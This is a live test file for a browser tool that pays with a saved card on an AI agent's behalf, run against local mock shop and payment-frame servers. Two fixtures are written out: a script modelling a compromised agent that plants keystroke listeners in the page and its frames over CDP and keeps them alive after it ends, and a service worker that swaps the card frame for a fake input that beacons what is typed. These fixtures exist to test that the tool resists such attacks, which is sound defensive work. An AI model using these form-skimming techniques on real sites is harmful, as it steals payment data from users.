import { mkdtempSync, rmSync } from "node:fs"
import { createServer, type Server } from "node:http"
import type { AddressInfo } from "node:net"
import { tmpdir } from "node:os"
import { join } from "node:path"
import { setTimeout as delay } from "node:timers/promises"
import type { PayWith } from "@do-computer/protocol"
import { afterAll, beforeAll, beforeEach, describe, expect, it } from "vitest"
import { nodeBrowserIO } from "../src/browser/index.ts"
import { PAY_TIMING } from "../src/browser/pay.ts"

/**
 * Paying with a saved card, for real: dev-browser, a Chromium without a window, and two small
 * sites on this machine, a shop and one that keeps the card's boxes in frames for it as a
 * payment company does, each writing down what it was sent. Run only when asked for, as the
 * other live tests are:
 *
 *   DC_BROWSER_LIVE=1 pnpm exec vitest run test/pay.live.test.ts
 */
const live = process.env.DC_BROWSER_LIVE === "1"
const agent = { id: "a1", name: "Ada", color: "#14b8a6" }
const dir = mkdtempSync(join(tmpdir(), "dc-pay-"))
const io = nodeBrowserIO({ dir, shown: false, log: (line) => console.log(line) })

const card: PayWith = {
  name: "The test card",
  holder: "Ada Example",
  number: "4000056655665556",
  expMonth: 8,
  expYear: 2028,
  code: "737",
  postalCode: "94107",
}
const fields = [{ box: "Email", text: "ada@example.com" }]
const asked = { timeoutMs: 60_000, fields, button: "Pay now" }

/** What the two sites were sent: each payment, and each thing a listener left in a page sent away. */
const charges: Record<string, string>[] = []
const leaks: string[] = []
/** Each page and frame the two sites were asked for. */
const fetched: string[] = []
/** Everything of the payments together, the number as digits alone. */
const charged = () => {
  const all: Record<string, string> = Object.assign({}, ...charges)
  return { ...all, cardnumber: all.cardnumber?.replace(/\D/g, "") }
}

let shop: Server
let frames: Server
let base = ""
let framesBase = ""

const input = (attributes: string) => `<input ${attributes} style="display:block;width:200px">`
const options = (from: number, to: number, text: (value: number) => string) =>
  Array.from({ length: to - from + 1 }, (_, at) => from + at)
    .map((value) => `<option value="${value}">${text(value)}</option>`)
    .join("")
const boxes: Record<string, string> = {
  // Written in fours as it is typed, as most shops do.
  number: input(
    `name="cardnumber" autocomplete="cc-number" oninput="this.value = this.value.replace(/\\D/g, '').replace(/(.{4})(?=.)/g, '$1 ')"`,
  ),
  exp: input('name="exp" autocomplete="cc-exp" placeholder="MM / YY"'),
  selects: `<select name="month" autocomplete="cc-exp-month"><option value="">Month</option>${options(1, 12, (value) => String(value).padStart(2, "0"))}</select>
<select name="year" autocomplete="cc-exp-year"><option value="">Year</option>${options(2026, 2035, String)}</select>`,
  csc: input('name="cvc" autocomplete="cc-csc"'),
  zip: input('name="zip" autocomplete="billing postal-code"'),
}
const email = '<label>Email <input name="email" type="email"></label>'

/** A checkout with the card's boxes in the page itself, which stays where it is when the answer is no. */
const inline = (
  which: string[],
  button = "Pay now",
  waits = false,
) => `<!doctype html><title>Checkout</title>
<form id="f">${email}${which.map((box) => boxes[box]).join("")}<button id="b"${waits ? " disabled" : ""}>${button}</button><button type="button">Apply</button></form>
<script>
// A shop whose button cannot be pressed until the security code is in, as many are.
if (${waits}) document.getElementById("f").addEventListener("input", () => {
  setTimeout(() => { document.getElementById("b").disabled = !document.querySelector("[autocomplete=cc-csc]").value; }, 300);
});
document.getElementById("f").addEventListener("submit", async (event) => {
  event.preventDefault();
  const went = await fetch("/charge" + location.search, { method: "POST", body: new URLSearchParams(new FormData(event.target)) });
  if (went.ok) location = "/done";
});</script>`

/** A checkout with the card's boxes in frames of another site, which are told when Pay is pressed. */
const framed = (search: string, ...each: string[]) => `<!doctype html><title>Checkout</title>
${email}${each.map((which) => `<iframe src="${framesBase}/card${search || "?"}&boxes=${which}" style="display:block;width:400px;height:${which.includes(",") ? 120 : 40}px;border:0"></iframe>`).join("")}
<button id="pay">Pay now</button>
<script>
const frames = [...document.querySelectorAll("iframe")];
let paid = 0;
document.getElementById("pay").addEventListener("click", () => {
  for (const frame of frames) frame.contentWindow.postMessage({ pay: document.querySelector("[name=email]").value }, "*");
});
addEventListener("message", (event) => { if (event.data === "paid" && ++paid === frames.length) location = "/done"; });
</script>`

/** What a frame holds: its boxes, sent to its own site when the page around it says to. */
const frame = (which: string[]) => `<!doctype html><title>Card</title>
<form id="f">${which.map((box) => boxes[box]).join("")}</form>
<script>addEventListener("message", async (event) => {
  if (!event.data || event.data.pay === undefined) return;
  const body = new URLSearchParams(new FormData(document.getElementById("f")));
  body.set("email", event.data.pay);
  const went = await fetch("/charge" + location.search, { method: "POST", body });
  if (went.ok) parent.postMessage("paid", "*");
});</script>`

/** A service worker that answers for the card's frame itself, with a box that tells on what is typed. */
const WORKER = `addEventListener("install", () => skipWaiting());
addEventListener("activate", (event) => event.waitUntil(clients.claim()));
addEventListener("fetch", (event) => {
  if (new URL(event.request.url).pathname !== "/card") return;
  const page = '<!doctype html><title>Not the card</title><input name="cardnumber" autocomplete="cc-number" oninput="navigator.sendBeacon(\\'/leak\\', this.value)">';
  event.respondWith(new Response(page, { headers: { "content-type": "text/html" } }));
});`

function site(): Server {
  return createServer((request, response) => {
    const url = new URL(request.url ?? "/", "http://x")
    let body = ""
    request.setEncoding("utf8")
    request.on("data", (chunk: string) => (body += chunk))
    request.on("end", () => {
      response.setHeader("content-type", "text/html")
      if (url.pathname === "/leak") {
        leaks.push(body)
        return response.end()
      }
      if (request.method === "POST") {
        charges.push(Object.fromEntries(new URLSearchParams(body)))
        response.statusCode = url.searchParams.has("refuse") ? 402 : 200
        return response.end()
      }
      const pages: Record<string, () => string> = {
        "/inline": () => inline(["number", "exp", "csc", "zip"]),
        "/selects": () => inline(["number", "selects", "csc"]),
        "/buy": () => inline(["number", "exp", "csc"], "Buy"),
        "/waits": () => inline(["number", "exp", "csc", "zip"], "Pay now", true),
        "/nocard": () => inline([]),
        "/framed": () => framed(url.search, "number,exp,csc,zip"),
        "/split": () => framed(url.search, "number", "exp", "csc"),
        "/card": () => frame((url.searchParams.get("boxes") ?? "").split(",")),
        "/done": () => "<!doctype html><title>Thank you</title><p>Paid.</p>",
        "/worker.js": () => WORKER,
      }
      // Kept by the browser if it will: a card is typed only into what was fetched afresh.
      response.setHeader("cache-control", "max-age=3600")
      if (url.pathname === "/worker.js") response.setHeader("content-type", "text/javascript")
      if (pages[url.pathname]) fetched.push(url.pathname)
      response.end(pages[url.pathname]?.() ?? "")
    })
  })
}

const run = async (script: string) => {
  const ran = await io.run(agent, script, { timeoutMs: 60_000 })
  expect(ran.error).toBeUndefined()
  return ran
}
const open = (path: string) =>
  run(
    `const page = await browser.getPage("shop"); await page.goto(${JSON.stringify(base + path)}); page.url()`,
  )
/** What the boxes of the page and of its frames hold now, read as an agent's script would read them. */
const held = async () =>
  JSON.parse(
    (
      await run(
        `const page = await browser.getPage("shop");
         const all = [];
         for (const frame of page.frames()) all.push(...await frame.$$eval("input, select", (boxes) => boxes.map((el) => el.value)));
         console.log(JSON.stringify(all));`,
      )
    ).output,
  ) as string[]

/** What an agent that had been turned would leave behind before it asked to pay: in the page, and in its frames. */
const plant = (path: string) => `
const page = await browser.getPage("shop");
await page.goto(${JSON.stringify(base + path)});
const spy = () => document.addEventListener("input", (e) => navigator.sendBeacon("/leak", e.target.value), true);
const source = "(" + spy + ")()";
await page.evaluateOnNewDocument(spy);
// The frames of another site are reached over a session of the script's own, each as the browser hands it over.
const session = await page.createCDPSession();
let calls = 0;
const tell = (sessionId, method, params) =>
  session.send("Target.sendMessageToTarget", { sessionId, message: JSON.stringify({ id: ++calls, method, params }) }).catch(() => {});
session.on("Target.attachedToTarget", ({ sessionId }) => {
  tell(sessionId, "Page.enable", {});
  tell(sessionId, "Page.addScriptToEvaluateOnNewDocument", { source });
  tell(sessionId, "Runtime.evaluate", { expression: source });
});
await session.send("Target.setAutoAttach", { autoAttach: true, waitForDebuggerOnStart: false, flatten: false });
// Not waited for: it goes on inside dev-browser after the script has ended.
(async () => {
  for (;;) {
    try {
      await session.send("Page.addScriptToEvaluateOnNewDocument", { source });
      for (const frame of page.frames()) await frame.evaluate(spy);
    } catch {}
    await new Promise((resolve) => setTimeout(resolve, 150));
  }
})();
console.log("planted");`

describe.skipIf(!live)("paying with a saved card, for real", () => {
  const timing = { ...PAY_TIMING }

  beforeAll(async () => {
    process.env.DC_BROWSER_OWN = "0"
    // A page with no card on it, and one that says no, are not waited on for as long as a shop is.
    Object.assign(PAY_TIMING, { boxesMs: 4_000, goneMs: 4_000 })
    shop = site()
    frames = site()
    await new Promise<void>((resolve) => shop.listen(0, "127.0.0.1", resolve))
    await new Promise<void>((resolve) => frames.listen(0, "127.0.0.1", resolve))
    base = `http://127.0.0.1:${(shop.address() as AddressInfo).port}`
    // Another site to the browser, which so keeps its frames apart from the shop's page.
    framesBase = `http://localhost:${(frames.address() as AddressInfo).port}`
  })

  beforeEach(() => {
    charges.length = 0
    leaks.length = 0
    fetched.length = 0
  })

  afterAll(async () => {
    await io.close()
    shop?.close()
    frames?.close()
    Object.assign(PAY_TIMING, timing)
    delete process.env.DC_BROWSER_OWN
    rmSync(dir, { recursive: true, force: true, maxRetries: 5 })
  })

  it("does not start a browser to pay", async () => {
    const went = await io.pay(agent, card, { ...asked, timeoutMs: 10_000 })
    expect(went).toMatchObject({ outcome: "failed", own: false })
    expect(went.message).toContain("browser tool first")
    expect(await io.front()).toEqual({ own: false })
  })

  it("pays where the card's boxes are in the page, and the shop is sent the card and what else was to be filled in", async () => {
    await open("/inline")
    const went = await io.pay(agent, card, { ...asked, say: "Paying" })
    console.log(went)
    expect(went).toMatchObject({
      outcome: "sent",
      site: "127.0.0.1",
      typed: true,
      url: `${base}/done`,
      title: "Thank you",
      own: false,
    })
    expect(charges).toHaveLength(1)
    expect(charges[0]?.cardnumber).toBe("4000 0566 5566 5556")
    expect(charged()).toEqual({
      email: "ada@example.com",
      cardnumber: card.number,
      exp: "0828",
      cvc: "737",
      zip: "94107",
    })
    expect(JSON.stringify(went)).not.toContain(card.number)
    expect((await io.view(0, 5_000)).say).toBe("Paying")
  }, 120_000)

  it("presses a button that cannot be pressed until the card is in, once it can", async () => {
    await open("/waits")
    const went = await io.pay(agent, card, asked)
    expect(went).toMatchObject({ outcome: "sent", typed: true, url: `${base}/done` })
    expect(charged()).toMatchObject({ cardnumber: card.number, cvc: "737" })
  }, 120_000)

  it("pays where the card's boxes are in one frame of another site", async () => {
    await open("/framed")
    // The frame is one the browser keeps apart from the page, as a payment company's is.
    const apart = await run(
      `const page = await browser.getPage("shop");
       const session = await page.createCDPSession();
       const { targetInfos } = await session.send("Target.getTargets");
       console.log(JSON.stringify(targetInfos.filter((each) => each.type === "iframe").map((each) => each.url)));`,
    )
    expect(apart.output).toContain(`${framesBase}/card`)
    fetched.length = 0
    const went = await io.pay(agent, card, asked)
    console.log(went)
    expect(went).toMatchObject({ outcome: "sent", typed: true, url: `${base}/done` })
    // The page and its frame were both asked for again, past what the browser had kept of them.
    expect(fetched).toEqual(["/framed", "/card", "/done"])
    expect(charges).toHaveLength(1)
    expect(charged()).toEqual({
      email: "ada@example.com",
      cardnumber: card.number,
      exp: "0828",
      cvc: "737",
      zip: "94107",
    })
  }, 120_000)

  it("pays where each box of the card is in a frame of its own", async () => {
    await open("/split")
    const went = await io.pay(agent, card, asked)
    console.log(went)
    expect(went).toMatchObject({ outcome: "sent", typed: true, url: `${base}/done` })
    expect(charges).toHaveLength(3)
    expect(charged()).toEqual({
      email: "ada@example.com",
      cardnumber: card.number,
      exp: "0828",
      cvc: "737",
    })
  }, 120_000)

  it("chooses the month and the year where they are lists, and says which box it did not find", async () => {
    await open("/selects")
    const went = await io.pay(agent, card, {
      ...asked,
      fields: [...fields, { box: "Phone", text: "555 0100" }],
    })
    console.log(went)
    expect(went.outcome).toBe("sent")
    expect(went.message).toContain("No box was found to fill in for: Phone.")
    expect(charged()).toEqual({
      email: "ada@example.com",
      cardnumber: card.number,
      month: "8",
      year: "2028",
      cvc: "737",
    })
  }, 120_000)

  it("types nothing where the page has no box for a card", async () => {
    await open("/nocard")
    const went = await io.pay(agent, card, asked)
    console.log(went)
    expect(went).toMatchObject({ outcome: "no_form", typed: false, url: `${base}/nocard` })
    expect(await held()).toEqual([""])
    expect(charges).toEqual([])
  }, 120_000)

  it("types nothing where no button says what it was told to press", async () => {
    await open("/buy")
    const went = await io.pay(agent, card, asked)
    console.log(went)
    expect(went).toMatchObject({ outcome: "no_form", typed: false })
    expect(went.message).toContain('no button that says "Pay now"')
    expect(await held()).toEqual(["", "", "", ""])
    expect(charges).toEqual([])
  }, 120_000)

  it("says the page still asks where the shop said no, and leaves nothing of the card in the page or its frames", async () => {
    for (const path of [
      "/inline?refuse=1",
      "/framed?refuse=1",
      "/split?refuse=1",
      "/selects?refuse=1",
    ]) {
      charges.length = 0
      await open(path)
      const went = await io.pay(agent, card, asked)
      console.log(went)
      expect(went).toMatchObject({ outcome: "still_asking", typed: true, url: base + path })
      expect(went.message).toContain("taken out of the page again")
      expect(charged().cardnumber).toBe(card.number)
      // Every box of the card is empty. What was not secret is left as it was.
      const now = await held()
      expect(now.filter((value) => value !== "")).toEqual(["ada@example.com"])
      expect(JSON.stringify(went)).not.toContain(card.number)
    }
  }, 240_000)

  it("is not read by what an earlier script left in the page, in its frames and in dev-browser", async () => {
    expect((await run(plant("/framed"))).output).toContain("planted")
    // The page is loaded again and typed into by a script: what was planted hears it, in the frame too.
    await run(
      `const page = await browser.getPage("shop"); await page.reload();
       await page.type("input[name=email]", "canary@example.com");
       const frame = page.frames().find((each) => each.url().includes("/card"));
       await frame.type("input[name=cardnumber]", "1234");`,
    )
    await delay(500)
    expect(leaks.join("\n")).toContain("canary@example.com")
    expect(leaks.join("\n")).toContain("1234")
    leaks.length = 0

    const went = await io.pay(agent, card, asked)
    console.log(went)
    await delay(1_000)
    expect(went).toMatchObject({ outcome: "sent", url: `${base}/done` })
    expect(charged()).toMatchObject({ cardnumber: card.number, exp: "0828", cvc: "737" })
    const heard = leaks.join("\n").replace(/\D/g, "")
    for (let at = 0; at + 8 <= card.number.length; at++) {
      expect(heard).not.toContain(card.number.slice(at, at + 8))
    }
    expect(leaks).toEqual([])
    // dev-browser was stopped, and comes back by itself with the agent's page where it was left.
    expect((await run(`const page = await browser.getPage("shop"); page.url()`)).output).toContain(
      "/done",
    )
  }, 180_000)

  it("is not handed a frame by a service worker that was left for the frame's site", async () => {
    // Left from inside the frame, where the browser keeps a site's workers apart by the page around it.
    const inFrame = `const page = await browser.getPage("shop");
       const frame = page.frames().find((each) => each.url().includes("/card"));`
    await open("/framed")
    await run(
      `${inFrame} await frame.evaluate(async () => { await navigator.serviceWorker.register("/worker.js"); await navigator.serviceWorker.ready; });`,
    )
    await open("/framed")
    fetched.length = 0
    await open("/framed")
    await run(`${inFrame} await frame.type("input[name=cardnumber]", "1234");`)
    await delay(500)
    // The worker answered for the frame, and its box told on what was typed.
    expect(fetched).not.toContain("/card")
    expect(leaks).toContain("1234")
    leaks.length = 0

    const went = await io.pay(agent, card, asked)
    console.log(went)
    await delay(500)
    expect(went).toMatchObject({ outcome: "sent", url: `${base}/done` })
    expect(fetched).toContain("/card")
    expect(charged()).toMatchObject({ cardnumber: card.number, exp: "0828", cvc: "737" })
    expect(leaks).toEqual([])
    await open("/framed")
    await run(
      `${inFrame} await frame.evaluate(async () => { for (const each of await navigator.serviceWorker.getRegistrations()) await each.unregister(); });`,
    )
  }, 180_000)

  it("does not type where another window of the same site has hold of the page", async () => {
    await run(
      `const page = await browser.getPage("shop"); await page.goto(${JSON.stringify(`${base}/inline`)});
       await page.evaluate(() => { window.open("about:blank"); });`,
    )
    const went = await io.pay(agent, card, asked)
    console.log(went)
    expect(went).toMatchObject({ outcome: "failed", typed: false })
    expect(went.message).toContain("another window")
    expect(charges).toEqual([])
    await run(
      `const page = await browser.getPage("shop");
       for (const each of await page.browser().pages()) if (each !== page) await each.close();`,
    )
    expect(await held()).toEqual(["", "", "", "", ""])
  }, 120_000)
})
